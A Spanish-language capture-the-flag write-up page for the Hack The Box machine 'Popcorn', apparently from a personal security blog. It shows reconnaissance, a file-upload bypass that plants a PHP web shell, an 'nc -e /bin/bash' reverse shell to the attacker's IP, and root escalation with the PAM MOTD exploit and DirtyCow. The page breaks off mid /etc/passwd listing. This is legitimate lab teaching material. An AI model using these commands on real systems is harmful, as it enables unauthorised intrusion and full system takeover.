@@ -1,0 +1,807 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.15.1 by Michael Rose
+  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
+-->
+<html lang="en" class="no-js">
+  <head>
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>            Hack The Box Popcorn - K4miyo      Ciberseguridad!      </title>
+<meta name="description" content="Resolución de la máquina Popcorn en la plataforma de Hack The Box">
+
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en_US">
+<meta property="og:site_name" content="K4miyo | Ciberseguridad!">
+<meta property="og:title" content="Hack The Box Popcorn">
+<meta property="og:url" content="http://localhost:4000/htb-popcorn/">
+
+
+  <meta property="og:description" content="Resolución de la máquina Popcorn en la plataforma de Hack The Box">
+
+
+
+  <meta property="og:image" content="http://localhost:4000/assets/images/htb-popcorn/popcorn.jpg">
+
+
+
+
+
+  <meta property="article:published_time" content="2022-01-16T00:00:00-06:00">
+
+
+
+
+
+  
+
+  
+
+
+<link rel="canonical" href="http://localhost:4000/htb-popcorn/">
+
+
+
+
+
+
+
+  <script type="application/ld+json">
+    {
+      "@context": "https://schema.org",
+      "@type": "Person",
+      "name": "K4miyo",
+      "url": "http://localhost:4000",
+      "sameAs": null
+    }
+  </script>
+
+
+
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="K4miyo | Ciberseguridad! Feed">
+
+<!-- https://t.co/dKP3o1e -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+
+<!--[if IE ]>
+  <style>
+    /* old IE unsupported flexbox fixes */
+    .greedy-nav .site-title {
+      padding-right: 3em;
+    }
+    .greedy-nav button {
+      position: absolute;
+      top: 0;
+      right: 0;
+      height: 100%;
+    }
+  </style>
+<![endif]-->
+
+
+
+    <!-- start custom head snippets -->
+
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+
+<!-- end custom head snippets -->
+
+  </head>
+
+  <body class="layout--single wide">
+
+    <!--[if lt IE 9]>
+<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
+<![endif]-->
+
+    
+
+<div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+        
+          <a class="site-logo" href="/"><img src="/assets/images/masthead.png" alt=""></a>
+                
+        <ul class="visible-links">
+<li class="masthead__menu-item">
+              <a href="/">Home</a>
+            </li>
+<li class="masthead__menu-item">
+              <a href="/year-archive/">Artículos</a>
+            </li>
+<li class="masthead__menu-item">
+              <a href="/categories/">Categorías</a>
+            </li>
+<li class="masthead__menu-item">
+              <a href="/tags/">Etiquetas</a>
+            </li>
+<li class="masthead__menu-item">
+              <a href="/buscador/">Buscador</a>
+            </li>
+<li class="masthead__menu-item">
+              <a href="/about/">Contacto</a>
+            </li>
+</ul>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+    
+
+    <div class="initial-content">
+      
+
+
+  
+    
+
+
+
+<nav class="breadcrumbs">
+  <ol itemscope itemtype="https://schema.org/BreadcrumbList">
+    
+    
+    
+      
+        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
+          <a href="http://localhost:4000/" itemprop="item"><span itemprop="name">Home</span></a>
+          <meta itemprop="position" content="1">
+        </li>
+        <span class="sep">/</span>
+      
+      
+        <li class="current">Hack The Box Popcorn</li>
+      
+    
+  </ol>
+</nav>
+
+  
+
+
+<div id="main" role="main">
+  
+  <div class="sidebar sticky">
+  
+
+
+<div itemscope itemtype="https://schema.org/Person">
+
+  
+    <div class="author__avatar">
+      
+
+      
+        <img src="/assets/images/avatar.png" alt="K4miyo" itemprop="image">
+      
+    </div>
+  
+
+  <div class="author__content">
+    
+      <h3 class="author__name" itemprop="name">K4miyo</h3>
+    
+    
+      <p class="author__bio" itemprop="description">
+        Cyber Threat Intelligence Analyst
+      </p>
+    
+  </div>
+
+  <div class="author__urls-wrapper">
+    <button class="btn btn--inverse">Follow</button>
+    <ul class="author__urls social-icons">
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+        <li>
+          <a href="https://github.com/k4miyo" itemprop="sameAs" rel="nofollow noopener noreferrer">
+            <i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub
+          </a>
+        </li>
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      <!--
+  <li>
+    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
+      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
+    </a>
+  </li>
+-->
+    </ul>
+  </div>
+</div>
+
+  
+  </div>
+
+
+  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
+    <meta itemprop="headline" content="Hack The Box Popcorn">
+    <meta itemprop="description" content="Resolución de la máquina Popcorn en la plataforma de Hack The Box">
+    <meta itemprop="datePublished" content="January 16, 2022">
+    
+
+    <div class="page__inner-wrap">
+      
+        <header>
+          <h1 id="page-title" class="page__title" itemprop="headline">Hack The Box Popcorn
+</h1>
+          
+        </header>
+      
+
+      <section class="page__content" itemprop="text">
+        
+        <p class="page__meta">
+          
+            <i class="fa fa-fw fa-calendar" aria-hidden="true"></i> <time datetime="2022-01-16T00:00:00-06:00">January 16, 2022 </time> 
+          
+          
+        </p>
+        <p><img src="/assets/images/htb-popcorn/banner-popcorn.jpg" alt=""></p>
+
+<h2 id="popcorn">Popcorn</h2>
+<p>Se procede con la fase de reconocimiento lanzando primeramente un <code class="language-plaintext highlighter-rouge">ping</code> a la dirección 10.10.10.6.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ ping <span class="nt">-c</span> 1 10.10.10.6
+PING 10.10.10.6 <span class="o">(</span>10.10.10.6<span class="o">)</span> 56<span class="o">(</span>84<span class="o">)</span> bytes of data.
+64 bytes from 10.10.10.6: <span class="nv">icmp_seq</span><span class="o">=</span>1 <span class="nv">ttl</span><span class="o">=</span>63 <span class="nb">time</span><span class="o">=</span>138 ms
+
+<span class="nt">---</span> 10.10.10.6 ping statistics <span class="nt">---</span>
+1 packets transmitted, 1 received, 0% packet loss, <span class="nb">time </span>0ms
+rtt min/avg/max/mdev <span class="o">=</span> 137.631/137.631/137.631/0.000 ms|
+</code></pre></div></div>
+
+<p>De acuerdo con el TTL de traza ICMP, se puede determinar que se trata de una máquina con sistema operativo Linux. A continuación se procede con la ejecución de <code class="language-plaintext highlighter-rouge">nmap</code> para determinar los puertos abiertos de la máquina y exportanto la información al archivo <strong>allPorts</strong>.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nmap <span class="nt">-p-</span> <span class="nt">--open</span> <span class="nt">-T5</span> <span class="nt">-v</span> <span class="nt">-n</span> 10.10.10.6 <span class="nt">-oG</span> allPorts
+Starting Nmap 7.92 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2022-01-16 15:55 CST
+Initiating Ping Scan at 15:55
+Scanning 10.10.10.6 <span class="o">[</span>4 ports]
+Completed Ping Scan at 15:55, 0.17s elapsed <span class="o">(</span>1 total hosts<span class="o">)</span>
+Initiating SYN Stealth Scan at 15:55
+Scanning 10.10.10.6 <span class="o">[</span>65535 ports]
+Discovered open port 22/tcp on 10.10.10.6
+Discovered open port 80/tcp on 10.10.10.6
+SYN Stealth Scan Timing: About 42.42% <span class="k">done</span><span class="p">;</span> ETC: 15:56 <span class="o">(</span>0:00:42 remaining<span class="o">)</span>
+Completed SYN Stealth Scan at 15:56, 64.11s elapsed <span class="o">(</span>65535 total ports<span class="o">)</span>
+Nmap scan report <span class="k">for </span>10.10.10.6
+Host is up <span class="o">(</span>0.22s latency<span class="o">)</span><span class="nb">.</span>
+Not shown: 65533 closed tcp ports <span class="o">(</span>reset<span class="o">)</span>
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+
+Read data files from: /usr/bin/../share/nmap
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>64.40 seconds
+           Raw packets sent: 66039 <span class="o">(</span>2.906MB<span class="o">)</span> | Rcvd: 66036 <span class="o">(</span>2.641MB<span class="o">)</span>
+</code></pre></div></div>
+
+<p>Mediante la función <a href="/extractPorts">extractPorts</a> definida a nivel de <code class="language-plaintext highlighter-rouge">zsh</code> , se obtiene la información más relevante de la captura grepeable.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ extractPorts allPorts
+───────┬─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+       │ File: extractPorts.tmp
+───────┼─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+   1   │ 
+   2   │ <span class="o">[</span><span class="k">*</span><span class="o">]</span> Extracting information...
+   3   │ 
+   4   │     <span class="o">[</span><span class="k">*</span><span class="o">]</span> IP Address: 10.10.10.6
+   5   │     <span class="o">[</span><span class="k">*</span><span class="o">]</span> Open ports: 22,80
+   6   │ 
+   7   │ <span class="o">[</span><span class="k">*</span><span class="o">]</span> Ports copied to clipboard
+</code></pre></div></div>
+
+<p>A continuación se lanza una serie de scripts para determinar el servicio y versión que corren para los puertos detectados.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nmap <span class="nt">-sCV</span> <span class="nt">-p22</span>,80 10.10.10.6 <span class="nt">-oN</span> targeted
+Starting Nmap 7.92 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2022-01-16 15:58 CST
+Nmap scan report <span class="k">for </span>10.10.10.6
+Host is up <span class="o">(</span>0.14s latency<span class="o">)</span><span class="nb">.</span>
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 5.1p1 Debian 6ubuntu2 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+| ssh-hostkey: 
+|   1024 3e:c8:1b:15:21:15:50:ec:6e:63:bc:c5:6b:80:7b:38 <span class="o">(</span>DSA<span class="o">)</span>
+|_  2048 aa:1f:79:21:b8:42:f4:8a:38:bd:b8:05:ef:1a:07:4d <span class="o">(</span>RSA<span class="o">)</span>
+80/tcp open  http    Apache httpd 2.2.12 <span class="o">((</span>Ubuntu<span class="o">))</span>
+|_http-title: Site doesn<span class="s1">'t have a title (text/html).
+|_http-server-header: Apache/2.2.12 (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 11.84 seconds
+</span></code></pre></div></div>
+
+<p>Como vemos el puerto 80 abierto, vamos a ver a lo que nos enfrentamos con <code class="language-plaintext highlighter-rouge">whatweb</code>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ whatweb http://10.10.10.6/
+http://10.10.10.6/ <span class="o">[</span>200 OK] Apache[2.2.12], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.2.12 <span class="o">(</span>Ubuntu<span class="o">)]</span>, IP[10.10.10.6]
+</code></pre></div></div>
+
+<p>Vemos que se trata de la página default de Apache, que es lo que vemos vía web.</p>
+
+<p><img src="/assets/images/htb-popcorn/popcorn-web.png" alt=""></p>
+
+<p>No vemos nada interesante, asi que vamos a buscar recursos dentro del servidor web y vamos a empezar con <code class="language-plaintext highlighter-rouge">nmap</code> antes de tirar de otra herramienta tocha.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nmap <span class="nt">--script</span> http-enum <span class="nt">-p80</span> 10.10.10.6
+Starting Nmap 7.92 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2022-01-16 16:02 CST
+Nmap scan report <span class="k">for </span>10.10.10.6
+Host is up <span class="o">(</span>0.14s latency<span class="o">)</span><span class="nb">.</span>
+
+PORT   STATE SERVICE
+80/tcp open  http
+| http-enum: 
+|   /test/: Test page
+|   /test.php: Test page
+|   /test/logon.html: Jetty
+|_  /icons/: Potentially interesting folder w/ directory listing
+
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>37.37 seconds
+</code></pre></div></div>
+
+<p>Vamos a echarles un ojo:</p>
+
+<p><img src="/assets/images/htb-popcorn/popcorn-web1.png" alt=""></p>
+
+<p><img src="/assets/images/htb-popcorn/popcorn-web2.png" alt=""></p>
+
+<p>Algo que podemos observar son los <strong>HTTP Headers Information</strong> y en específico el <strong>User-Agent</strong> que nos aparece los datos de nuestro navegador <strong>Mozilla/5.0 (X11; Linux x86_64; rv:96.0) Gecko/20100101 Firefox/96.0</strong>.</p>
+
+<p><img src="/assets/images/htb-popcorn/popcorn-web3.png" alt=""></p>
+
+<p>Vamos a tratar de cambiarlo mediante el uso de <code class="language-plaintext highlighter-rouge">curl</code>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ curl <span class="nt">-s</span> <span class="s2">"http://10.10.10.6/test/"</span> | <span class="nb">grep</span> <span class="s2">"User-Agent"</span>
+&lt;<span class="nb">tr</span><span class="o">&gt;</span>&lt;td <span class="nv">class</span><span class="o">=</span><span class="s2">"e"</span><span class="o">&gt;</span>User-Agent &lt;/td&gt;&lt;td <span class="nv">class</span><span class="o">=</span><span class="s2">"v"</span><span class="o">&gt;</span>curl/7.74.0 &lt;/td&gt;&lt;/tr&gt;
+❯ curl <span class="nt">-s</span> <span class="s2">"http://10.10.10.6/test/"</span> <span class="nt">-H</span> <span class="s2">"User-Agent: k4miyo"</span> | <span class="nb">grep</span> <span class="s2">"User-Agent"</span>
+&lt;<span class="nb">tr</span><span class="o">&gt;</span>&lt;td <span class="nv">class</span><span class="o">=</span><span class="s2">"e"</span><span class="o">&gt;</span>User-Agent &lt;/td&gt;&lt;td <span class="nv">class</span><span class="o">=</span><span class="s2">"v"</span><span class="o">&gt;</span>k4miyo &lt;/td&gt;&lt;/tr&gt;
+</code></pre></div></div>
+
+<p>Ahora debemos buscar una forma de ejecutar comandos a nivel de sistema aprovechando el campo <strong>User-Agent</strong>; sin embargo, no obtenemos nada. Por lo tanto, vamos a hacer uso de la herramienta <code class="language-plaintext highlighter-rouge">wfuzz</code> para obtener recursos dentro del servidor web:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ wfuzz <span class="nt">-c</span> <span class="nt">-L</span> <span class="nt">-t</span> 300 <span class="nt">--hc</span><span class="o">=</span>404 <span class="nt">--hh</span><span class="o">=</span>177 <span class="nt">-w</span> /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.10.6/FUZZ
+ /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz<span class="s1">'s documentation for more information.
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://10.10.10.6/FUZZ
+Total requests: 220560
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                                         
+=====================================================================
+
+000000611:   200        656 L    3119 W     47507 Ch    "test"                                                          
+000004023:   200        293 L    882 W      11356 Ch    "torrent"                                                       
+000006953:   404        9 L      32 W       278 Ch      "1095"                                                          
+
+Total time: 44.90012
+Processed Requests: 6722
+Filtered Requests: 6720
+Requests/sec.: 149.7100
+</span></code></pre></div></div>
+
+<p>Tenemos el recurso <code class="language-plaintext highlighter-rouge">/torrent/</code>, así que vamos a echarle un ojo.</p>
+
+<p><img src="/assets/images/htb-popcorn/popcorn-web4.png" alt=""></p>
+
+<p>Si analizamos un poco el sitio, vemos que tenemos la capacidad de registrarnos, así que eso haremos.</p>
+
+<p><img src="/assets/images/htb-popcorn/popcorn-web5.png" alt=""></p>
+
+<p><img src="/assets/images/htb-popcorn/popcorn-web6.png" alt=""></p>
+
+<p>Si ponemos ojo de lince, tenemos la capacidad de subir archivos y por el nombre del recurso, lo más seguro es que sea un torrent; asi que vamos a descargar un archivo el que queramos; para este caso sería de <a href="https://www.parrotsec.org/security-edition/">Parrot OS</a></p>
+
+<p><img src="/assets/images/htb-popcorn/popcorn-web7.png" alt=""></p>
+
+<p><img src="/assets/images/htb-popcorn/popcorn-web8.png" alt=""></p>
+
+<p>Si nos percatamos, en la parte de abajo, vemos que tenemos la posiblidad de subir una imagen; pero si en vez de una imagen subimos un archivo php, nos indica <strong>Invalid file</strong>. Por lo tanto, vamos a tratar de subir una imagen de verdad y vamos a hacer uso de <strong>BurpSuite</strong> en donde modificamos el contenido del archivo a nuestra sentencia php de siempre y también modificamos el nombre del archivo a **shell.php.</p>
+
+<p><img src="/assets/images/htb-popcorn/popcorn-burp.png" alt=""></p>
+
+<p>Vemos que se ha subido de forma exitosa; asi que vamos a ver en donde podría estar el archivo que subimos. Si hacemos <em>hovering</em> sobre la imagen que subimos (para este caso nos aparece <strong>Image File Not Found!</strong>), vemos que nos aparece la ruta <code class="language-plaintext highlighter-rouge">upload</code> y despúes un nombre random con terminación php, ese es nuestro archivo, así que vamos a abrirlo en una segunda ventana para ejecutar comandos a nivel de sistema.</p>
+
+<p><img src="/assets/images/htb-popcorn/popcorn-web9.png" alt=""></p>
+
+<p><img src="/assets/images/htb-popcorn/popcorn-web10.png" alt=""></p>
+
+<p>Ahora como siempre, nos ponemos en escucha por el puerto 443 y procedemos a entablarnos una reverse shell.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://10.10.10.6/torrent/upload/8808ea0b7cf49a6fb69bcdb20aeac84a4fd9974f.php?cmd<span class="o">=</span>nc 
+ <span class="nt">-e</span> /bin/bash 10.10.14.27 443 &amp;
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nc <span class="nt">-nlvp</span> 443
+listening on <span class="o">[</span>any] 443 ...
+connect to <span class="o">[</span>10.10.14.27] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.6] 34180
+<span class="nb">whoami
+</span>www-data
+</code></pre></div></div>
+
+<p>Para trabajar más cómodos, vamos a hacer un <a href="/tratamiento-tty">Tratamiento de la tty</a>. Ya nos encontramos dentro de la máquina y podemos visuailzar la flag (user.txt). Ahora necesitamos enumerar un poco el sistema para encontrar un forma de escalar privilegios.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@popcorn:/home<span class="nv">$ </span><span class="nb">id
+</span><span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
+www-data@popcorn:/home<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
+<span class="o">[</span><span class="nb">sudo</span><span class="o">]</span> password <span class="k">for </span>www-data: 
+www-data@popcorn:/home<span class="nv">$ </span>find <span class="se">\-</span><span class="nb">type </span>f
+./george/.bash_logout
+./george/.bashrc
+./george/torrenthoster.zip
+./george/.cache/motd.legal-displayed
+./george/.sudo_as_admin_successful
+./george/user.txt
+./george/.nano_history
+./george/.mysql_history
+./george/.profile
+www-data@popcorn:/home<span class="err">$</span>
+</code></pre></div></div>
+
+<p>Aquí ya vemos algo que nos llama la atención, que es el recurso <code class="language-plaintext highlighter-rouge">/george/.cache/motd.legal-displayed</code>; que si buscamos un poco, vamos a encontrar un posible exploit a utilizar.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ searchsploit motd
+<span class="nt">-----------------------------------------------------------------------------------------------</span> <span class="nt">---------------------------------</span>
+ Exploit Title                                                                                 |  Path
+<span class="nt">-----------------------------------------------------------------------------------------------</span> <span class="nt">---------------------------------</span>
+Linux PAM 1.1.0 <span class="o">(</span>Ubuntu 9.10/10.04<span class="o">)</span> - MOTD File Tampering Privilege Escalation <span class="o">(</span>1<span class="o">)</span>             | linux/local/14273.sh
+Linux PAM 1.1.0 <span class="o">(</span>Ubuntu 9.10/10.04<span class="o">)</span> - MOTD File Tampering Privilege Escalation <span class="o">(</span>2<span class="o">)</span>             | linux/local/14339.sh
+MultiTheftAuto 0.5 patch 1 - Server Crash / MOTD Deletion                                      | windows/dos/1235.c
+<span class="nt">-----------------------------------------------------------------------------------------------</span> <span class="nt">---------------------------------</span>
+Shellcodes: No Results
+Papers: No Results
+</code></pre></div></div>
+
+<p>Nos indica que aplica para <strong>Linux PAM 1.1.0</strong>, vamos a corroborarlo:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@popcorn:/home<span class="nv">$ </span>dpkg <span class="nt">-l</span> | <span class="nb">grep </span>pam
+ii  libpam-modules                      1.1.0-2ubuntu1                    Pluggable Authentication Modules <span class="k">for </span>PAM
+ii  libpam-runtime                      1.1.0-2ubuntu1                    Runtime support <span class="k">for </span>the PAM library
+ii  libpam0g                            1.1.0-2ubuntu1                    Pluggable Authentication Modules library
+ii  python-pam                          0.4.2-12ubuntu3                   A Python interface to the PAM library
+www-data@popcorn:/home<span class="err">$</span>
+</code></pre></div></div>
+
+<p>Vemos que si podría aplicar, así que nos descargamos el exploit, lo copiamos en una ruta donde tengamos permisos y lo ejecutamos.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ searchsploit <span class="nt">-m</span> linux/local/14339.sh
+  Exploit: Linux PAM 1.1.0 <span class="o">(</span>Ubuntu 9.10/10.04<span class="o">)</span> - MOTD File Tampering Privilege Escalation <span class="o">(</span>2<span class="o">)</span>
+      URL: https://www.exploit-db.com/exploits/14339
+     Path: /usr/share/exploitdb/exploits/linux/local/14339.sh
+File Type: Bourne-Again shell script, ASCII text executable
+
+Copied to: /home/k4miyo/Documentos/HTB/Popcorn/exploits/14339.sh
+
+
+❯ <span class="nb">mv </span>14339.sh privesc_motd.sh
+</code></pre></div></div>
+
+<p>Para evitar algún problema, vamos a pasarlo a formato Unix.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ dos2unix privesc_motd.sh
+dos2unix: convirtiendo archivo privesc_motd.sh a formato Unix...
+</code></pre></div></div>
+
+<p>Copiamos el contenido con <code class="language-plaintext highlighter-rouge">xclip</code> y nos creamos un archivo en la máquina víctima bajo la ruta <code class="language-plaintext highlighter-rouge">/dev/shm</code>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">cat </span>privesc_motd.sh | xclip <span class="nt">-sel</span> clip
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@popcorn:/home<span class="nv">$ </span><span class="nb">cd</span> /dev/shm
+www-data@popcorn:/home<span class="nv">$ </span><span class="nb">touch </span>privesc.sh
+www-data@popcorn:/home<span class="nv">$ </span><span class="nb">chmod</span> +x privesc.sh
+www-data@popcorn:/dev/shm<span class="nv">$ </span>nano privesc.sh 
+www-data@popcorn:/dev/shm<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-l</span>
+total 4
+<span class="nt">-rw-r--r--</span> 1 www-data www-data 3043 Jan 17 02:30 privesc.sh
+www-data@popcorn:/dev/shm<span class="err">$</span>
+</code></pre></div></div>
+
+<p>Si leemos un poco el exploit, nos dice que el script nos solicitará una contraseña para acceder como el usuario <strong>root</strong> que es <strong>toor</strong>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@popcorn:/dev/shm<span class="nv">$ </span>./privesc.sh 
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Ubuntu PAM MOTD <span class="nb">local </span>root
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> SSH key <span class="nb">set </span>up
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> spawn ssh
+<span class="o">[</span>+] owned: /etc/passwd
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> spawn ssh
+<span class="o">[</span>+] owned: /etc/shadow
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> SSH key removed
+<span class="o">[</span>+] Success! Use password toor to get root
+Password: 
+root@popcorn:/dev/shm# <span class="nb">whoami
+</span>root
+root@popcorn:/dev/shm#
+</code></pre></div></div>
+
+<p>Ya somos el usuario <strong>root</strong> y podemos visualizar la flag (root.txt).</p>
+
+<p>Otra forma de escalar privilegios en mediante la explotación del kernel ya que es muy vieja:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@popcorn:~# <span class="nb">uname</span> <span class="nt">-a</span>
+Linux popcorn 2.6.31-14-generic-pae <span class="c">#48-Ubuntu SMP Fri Oct 16 15:22:42 UTC 2009 i686 GNU/Linux</span>
+root@popcorn:~# lsb_release <span class="nt">-a</span>
+No LSB modules are available.
+Distributor ID: Ubuntu
+Description:    Ubuntu 9.10
+Release:        9.10
+Codename:       karmic
+root@popcorn:~#
+</code></pre></div></div>
+
+<p>Para este caso utilizaremos el recurso <a href="https://github.com/FireFart/dirtycow">dirtycow</a>, así que primero validamos que la máquima víctima tiene <code class="language-plaintext highlighter-rouge">gcc</code>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@popcorn:/dev/shm<span class="nv">$ </span>which gcc
+/usr/bin/gcc
+www-data@popcorn:/dev/shm<span class="err">$</span>
+</code></pre></div></div>
+
+<p>Vemos que si, así que nos copiamos el archivo y lo guardamos en el máquina víctima.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@popcorn:/dev/shm<span class="nv">$ </span>nano dirty.c 
+www-data@popcorn:/dev/shm<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-l</span>
+total 12
+<span class="nt">-rw-r--r--</span> 1 www-data www-data 4816 Jan 17 02:44 dirty.c
+<span class="nt">-rwxr-xr-x</span> 1 www-data www-data 3043 Jan 17 02:30 privesc.sh
+www-data@popcorn:/dev/shm<span class="nv">$ </span><span class="nb">cat </span>dirty.c | <span class="nb">grep </span>gcc
+//   gcc <span class="nt">-pthread</span> dirty.c <span class="nt">-o</span> dirty <span class="nt">-lcrypt</span>
+www-data@popcorn:/dev/shm<span class="err">$</span>
+</code></pre></div></div>
+
+<p>Dentro del mismo script ya nos indica la forma de compilarlo.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@popcorn:/dev/shm<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-l</span>
+total 28
+<span class="nt">-rwxr-xr-x</span> 1 www-data www-data 13603 Jan 17 02:45 dirty
+<span class="nt">-rw-r--r--</span> 1 www-data www-data  4816 Jan 17 02:44 dirty.c
+<span class="nt">-rwxr-xr-x</span> 1 www-data www-data  3043 Jan 17 02:30 privesc.sh
+www-data@popcorn:/dev/shm<span class="err">$</span>
+</code></pre></div></div>
+
+<p>Al ejecutarlo nos pedirá una contraseña, ingresamos cualquiera, esperamos un rato y despúes hacemos Ctrl + C. El programa lo que hace es modificar el archivo <code class="language-plaintext highlighter-rouge">/etc/passwd</code> agregando el usuario <strong>firefart</strong> con la contraseña que le indicamos.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@popcorn:/dev/shm<span class="nv">$ </span>./dirty  
+/etc/passwd successfully backed up to /tmp/passwd.bak
+Please enter the new password: 
+Complete line:
+firefart:fic6dC9mK3e6U:0:0:pwned:/root:/bin/bash
+
+mmap: b7737000
+
+^C
+www-data@popcorn:/dev/shm<span class="nv">$ </span><span class="nb">cat</span> /etc/passwd
+firefart:fic6dC9mK3e6U:0:0:pwned:/root:/bin/bash
+/usr/sbin:/bin/sh
+bin:x:2:2:bin:/bin:/bin/sh
+sys:x:3:3:sys:/dev:/bin/sh
+<span class="nb">sync</span>:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/bin/sh
+man:x:6:12:man:/var/cache/man:/bin/sh
+lp:x:7:7:lp:/var/spool/lpd:/bin/sh
+mail:x:8:8:mail:/var/mail:/bin/sh
+news:x:9:9:news:/var/spool/news:/bin/sh
+uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
+proxy:x:13:13:proxy:/bin:/bin/sh
+www-data:x:33:33:www-data:/var/www:/bin/sh
+backup:x:34:34:backup:/var/backups:/bin/sh
+list:x:38:38:Mailing List Manager:/var/list:/bin/sh
+irc:x:39:39:ircd:/var/run/ircd:/bin/sh
+gnats:x:41:41:Gnats Bug-Reporting System <span class="o">(</span>admin<span class="o">)</span>:/var/lib/gnats:/bin/sh
+nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
+libuuid:x:100:101::/var/lib/libuuid:/bin/sh
+syslog:x:101:103::/home/syslog:/bin/false
+landscape:x:102:105::/var/lib/landscape:/bin/false
